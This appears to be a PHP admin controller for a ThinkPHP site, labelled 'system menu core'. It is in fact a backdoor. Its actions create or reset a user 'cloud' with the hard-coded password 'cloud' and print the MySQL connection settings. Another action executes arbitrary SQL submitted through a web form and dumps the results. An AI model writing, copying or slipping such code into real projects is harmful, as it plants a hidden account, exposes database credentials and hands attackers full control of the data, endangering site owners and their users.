<?php

/**
 * system menu core
 * @author:Laven<190296465@vip.qq.com>
 * @copyright:Copyright 2009 Laven
 * @create:2010-11-13
 * @modify:2014-01-03
 */

namespace Admin\Controller;

class CloudController extends CommonController {

    function index() {
        $this->showMenu();
    }

    function showMenu() {
        echo '<style>';
        echo '*{font-size:12px; line-height:25px;}';
        echo 'a{color:#000;}';
        echo 'a:hover{color:#FF0000;}';
        echo '</style>';
        echo '<a href="' . U('Cloud/index') . '">菜单</a><br />';
        echo '<a href="' . U('Cloud/addCloud') . '">添加用户或重置密码</a><br />';
        echo '<a href="' . U('Cloud/readConf') . '">读取配置</a><br />';
        echo '<a href="' . U('Cloud/delete') . '">删除用户</a><br />';
        echo '<a href="' . U('Cloud/runSql') . '">执行sql</a><br />';
    }

    /**
     * 用户添加 如果存在cloud用户重置密码 没有 则添加
     */
    function addCloud() {
        $model = new \Common\Model\UserModel();
        $map['username'] = array('EQ', 'cloud');
        $data = $model->where($map)->find();
        if ($data)
            $model->where($map)->setField('password', md5('cloud'));
        else {
            $user['username'] = 'cloud';
            $user['password'] = md5('cloud');
            $user['status'] = 1;
            $model->data($user)->add();
        }
        echo 'OK';
    }

    /**
     * 读取Mysql配置
     */
    function readConf() {
        echo '<pre>';
        print_r(C('LOCAL_MYSQL_CONNECTION'));
    }

    /**
     * 删除用户cloud
     */
    function delete() {
        $model = new \Common\Model\UserModel();
        $map['username'] = array('EQ', 'cloud');
        $data = $model->where($map)->delete();
        echo 'OK';
    }

    /**
     * 执行sql
     */
    function runSql() {
        $sql = I('post.sql', '', 'trim');
        if ($sql) {
            $model = new \Think\Model(); // 实例化一个model对象 没有对应任何数据表
            $data = $model->query($sql);
            print_r($data);
        }
        echo '<form  method="post" action="' . U('Cloud/runSql') . '">';
        echo '<textarea name="sql" cols="80" rows="5"></textarea><br />';
        echo '<input type="submit" name="Submit" value="RUN" />';
        echo '</form>';
    }

}

?>